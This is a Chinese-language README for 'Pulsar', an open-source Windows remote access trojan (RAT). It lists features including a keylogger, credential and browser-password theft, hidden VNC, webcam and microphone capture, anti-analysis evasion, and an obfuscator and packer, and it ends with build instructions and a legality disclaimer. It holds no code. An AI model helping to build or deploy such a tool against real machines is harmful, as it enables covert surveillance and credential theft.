
---

# Pulsar

[![Build](https://img.shields.io/github/actions/workflow/status/BruceLi20110501/Pulsar_RAT/dotnet.yml?branch=main)](https://github.com/BruceLi20110501/Pulsar_RAT/actions/workflows/dotnet.yml)
[![Downloads](https://img.shields.io/github/downloads/BruceLi20110501/Pulsar_RAT/total.svg)](https://github.com/BruceLi20110501/Pulsar_RAT/releases)
[![License](https://img.shields.io/github/license/BruceLi20110501/Pulsar_RAT.svg)](LICENSE)
![.NET Framework](https://img.shields.io/badge/.NET_Framework-4.7.2+-512BD4?logo=.net)
![Windows](https://img.shields.io/badge/OS-Windows-0078D6?logo=windows)

> **一款适用于 Windows 的免费开源远程管理工具（RAT）**

Pulsar 是一款采用 C# 编写的轻量级、高性能远程管理工具。无论是提供远程技术支持、执行日常系统管理任务，还是监控终端设备，Pulsar 都具有较高的稳定性和直观的操作界面，是远程管理的理想选择。

---

## ⚙️ 系统要求

需要安装 **.NET 9.0 Desktop Runtime**

## 📖 目录

* 截图展示
* 主要功能
* 下载
* 快速开始
* 支持的平台
* 编译方法
* 参与贡献
* 开发路线图
* 开源许可证
* 贡献者
* 安全声明
* 致谢

## 📸 截图

| **远程命令行**    | **远程桌面**       | **文件管理器**    |
| ------------ | -------------- | ------------ |
| Remote Shell | Remote Desktop | File Manager |

---

## ✨ 主要功能

* 🌐 **TCP 网络通信** —— 支持 IPv4 与 IPv6
* ⚡ **高速序列化** —— 使用 Protocol Buffers 提高数据传输效率
* 🔒 **加密通信** —— 全程采用 TLS 加密
* 📡 **UPnP 支持** —— 自动端口映射，简化配置
* 🖥️ **HVNC** —— 隐藏式虚拟网络计算（Hidden Virtual Network Computing）
* 🕵️‍♂️ **内置 Kematian Gatherer** —— 集成凭据收集功能
* 📋 **任务管理器** —— 查看和管理远程进程
* 🗂️ **文件管理器** —— 浏览、上传和下载远程文件
* ⏳ **启动项管理** —— 管理系统启动程序
* 🖧 **远程桌面** —— 支持 DirectX 的完整远程桌面控制
* 💻 **远程命令行（Shell）** —— 命令行访问远程系统
* ⚙️ **远程执行** —— 远程运行命令和脚本
* ℹ️ **系统信息** —— 获取详细系统信息
* 🔧 **注册表编辑器** —— 远程编辑 Windows 注册表
* 🔋 **系统电源控制** —— 重启、关机或待机
* ⌨️ **键盘记录器** —— 支持 Unicode 的键盘记录功能
* 🌉 **反向代理** —— 支持 SOCKS5 代理
* 🔑 **密码恢复** —— 提取浏览器及 FTP 客户端保存的密码
* 🔐 **权限提升/降级** —— 管理进程权限等级
* 🚫 **IP 屏蔽** —— 屏蔽指定连接
* 📩 **Telegram 通知** —— 通过 Telegram 接收通知
* 🛡️ **内置混淆器与加壳器** —— 保护生成的程序
* 🛑 **反虚拟机 / 反调试** —— 对抗分析环境
* 🖼️ **屏幕特效（Screen Corrupter / Illuminati）** —— 娱乐性/实验性功能
* 📷 **摄像头采集** —— 获取远程摄像头画面
* 🎤 **麦克风采集** —— 录制远程麦克风音频
* 💬 **聊天** —— 与远程用户实时聊天
* 📝 **远程脚本执行** —— 支持执行 PowerShell、Batch 以及自定义脚本
* **……以及更多功能！**

---

## 📥 下载

**最新稳定版本**

---

## 🚀 快速开始

1. 下载最新发布版本。
2. 将压缩包解压到任意目录。
3. 运行 `Pulsar.exe`（服务端），或根据需要自行编译客户端。
4. 使用内置的 Client Builder 配置相关参数。

> **注意：** Pulsar 仅供合法的系统管理和教育用途使用。访问远程系统前，请确保已获得授权。

---

## 🖥️ 支持的平台

**运行环境：**

* .NET Framework 4.5.2 或更高版本

**支持的操作系统（32 位 / 64 位）：**

* Windows 11
* Windows Server 2022
* Windows 10
* Windows Server 2019
* Windows Server 2016
* Windows 8 / 8.1
* Windows Server 2012
* Windows 7
* Windows Server 2008 R2

---

## 🛠️ 编译方法

1. 使用安装了 **.NET Desktop Development** 工作负载的 **Visual Studio 2019 或更高版本** 打开 `Pulsar.sln`。
2. 恢复 NuGet 包（Restore NuGet Packages）。
3. 编译项目（Build → F6）。
4. 可执行文件位于 `Bin` 目录。

### 客户端编译配置

| 配置          | 用途   | 说明                                       |
| ----------- | ---- | ---------------------------------------- |
| **Debug**   | 测试   | 使用 `Settings.cs` 中预设配置，编译前请自行修改。         |
| **Release** | 正式使用 | 运行 `Pulsar.exe`，通过 Client Builder 配置客户端。 |

**常见问题：**

* 请确保所有 NuGet 依赖均已成功恢复。
* 若编译失败，请检查 .NET Framework 版本及 Visual Studio 工作负载是否正确安装。

---

## 🤝 参与贡献

欢迎参与项目开发。

贡献代码、提交 Bug、提出功能建议都十分欢迎，详情请参阅 `CONTRIBUTING.md`。

---

## 🗺️ 开发路线图

想了解未来计划？

请查看 `ROADMAP.md`。

---

## 📜 开源许可证

Pulsar 基于 **MIT License** 开源。

第三方许可证可在 `Licenses` 目录查看。

---

## 😎 贡献者


* **𝙎𝙐𝙍𝙂𝙀 𝙒𝙄𝙉** —— 项目二开与维护
* **Bruce** —— 项目二开与汉化
* **KingKDot** —— 项目负责人
* **Twobit** —— 多项功能开发
* **Lucky** —— HVNC 专家
* **fedx** —— README 设计、Discord RPC
* **Ace** —— HVNC 功能、WinRE 生存模式
* **Java** —— 功能开发
* **Body** —— 代码混淆
* **cpores** —— VNC 绘图、收藏夹、覆盖层
* **Rishie** —— Gatherer 功能
* **jungsuxx** —— HVNC 输入及代码优化
* **MOOM (my lebron)** —— 灵感提供、Batch 混淆
* **Poli** —— Discord 服务器、Pulsar 自定义加密器
* **Deadman** —— 内存转储、Shellcode Builder
* **User76** —— 网络优化
* **TOXI** —— 完整插件系统及其他改进

---

## 🛡️ 安全声明

Pulsar 是一款功能强大的远程管理工具，仅应用于**合法且经过授权**的场景。

未经系统所有者明确授权而使用本工具属于违法且不符合道德规范的行为。

开发者不对任何滥用行为承担责任。

---

## 🙏 致谢

感谢所有用户提出的建议、反馈以及贡献！

感谢您使用并支持 Pulsar。

**如果您喜欢这个项目，请为它点一个 ⭐ Star，感谢您的支持！**
